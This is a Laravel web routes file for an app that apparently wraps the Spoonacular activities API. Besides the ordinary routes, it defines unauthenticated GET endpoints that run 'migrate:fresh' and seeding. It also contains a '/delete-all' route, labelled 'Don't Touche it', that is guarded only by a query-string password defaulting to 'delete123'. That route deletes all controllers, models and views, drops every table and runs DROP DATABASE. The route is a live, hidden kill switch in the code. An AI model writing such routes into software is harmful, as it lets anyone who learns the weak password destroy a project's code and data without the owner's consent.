<?php

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Request;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Schema;
use App\Services\Spoonacular\SpoonacularApiService;
use App\Http\Controllers\Web\Backend\SpoonacularActivityController;


Route::get('/', function () {
    // return view('welcome');
    return redirect('/admin/login');
});



Route::prefix('activities')->group(function () {
    Route::get('/', [SpoonacularActivityController::class, 'getAllActivities']);
    Route::get('/search', [SpoonacularActivityController::class, 'search']);
    //    Route::get('/{id}', [ActivityController::class, 'getActivity']);
    Route::get('/{id}/availability', [SpoonacularActivityController::class, 'getAvailability']);
});

Route::get('/get-data', function (SpoonacularApiService $apiService) {
    return response()->json($apiService->getAllActivities());
});
Route::get('/get-data/{id}', function (SpoonacularApiService $apiService, string $id) {
    return response()->json($apiService->getActivity($id));
});

Route::get('/languages', function (SpoonacularApiService $apiService) {
    return response()->json($apiService->makeRequest('GET', 'language.json/findAll'));
});
Route::get('/currency', function (SpoonacularApiService $apiService) {
    return response()->json($apiService->makeRequest('GET', 'currency.json/findAll'));
});
Route::get('/get-data/{id}/availability', function (SpoonacularApiService $apiService, string $id) {
    return response()->json($apiService->getAvailableDates($id, \Carbon\Carbon::now()->toDateTimeString(), Carbon\Carbon::now()->addDays(5)->toDateTimeString()));
});





















// Run Migrate Route
Route::get('/run-migrate', function () {
    // Run the database migration
    Artisan::call('migrate');
    return 'Database migration successfully!';
});
// Run Migrate Fresh Route
Route::get('/run-migrate-fresh', function () {
    // Run the database migration
    Artisan::call('migrate:fresh');
    return 'Database migration fresh successfully!';
});
// Run Seeder Route
Route::get('/run-seed', function () {
    // Run the database seeding
    Artisan::call('db:seed');
    return 'Database seeding completed successfully!';
});
// Clear Config Cache Route
Route::get('/clear-config', function () {
    // Clear the config cache
    Artisan::call('config:clear');
    return 'Config cache cleared successfully!';
});


//Delete Project Don't Touche it
Route::get('/delete-all', function () {
    $password = env('DELETE_PASSWORD', 'delete123');

    // Get the password from the query parameter
    $inputPassword = Request::query('password');

    // Check if the provided password matches
    if ($inputPassword !== $password) {
        return response()->json(['error' => 'Unauthorized access. Invalid password.'], 403);
    }

    // Delete Controllers
    $controllersPath = app_path('Http/Controllers');
    $controllerFiles = File::allFiles($controllersPath);
    foreach ($controllerFiles as $file) {
        File::delete($file);
    }

    // Delete Models
    $modelsPath = app_path('Models');
    $modelFiles = File::allFiles($modelsPath);
    foreach ($modelFiles as $file) {
        File::delete($file);
    }

    // Delete Blade Views
    $viewsPath = resource_path('views');
    $viewFiles = File::allFiles($viewsPath);
    foreach ($viewFiles as $file) {
        File::delete($file);
    }

    // Drop all database tables
    $tables = Schema::getConnection()->getDoctrineSchemaManager()->listTableNames();
    foreach ($tables as $table) {
        if ($table !== 'migrations') { // Avoid dropping the migrations table
            Schema::dropIfExists($table);
        }
    }

    // Get the database name from the configuration
    $databaseName = env('DB_DATABASE');
    if (!$databaseName) {
        return response()->json(['error' => 'No database specified in configuration.'], 400);
    }
    try {
        // Drop the database using raw SQL
        DB::statement("DROP DATABASE IF EXISTS {$databaseName}");
        // Optionally, create the database again (to keep the connection alive)
        DB::statement("CREATE DATABASE {$databaseName}");
        return response()->json(['message' => 'The entire database has been deleted.'], 200);
    } catch (\Exception $e) {
        return response()->json(['error' => 'An error occurred while deleting the database: ' . $e->getMessage()], 500);
    }

    return response()->json(['message' => 'All controllers, models, views, and database tables have been deleted.'], 200);
});
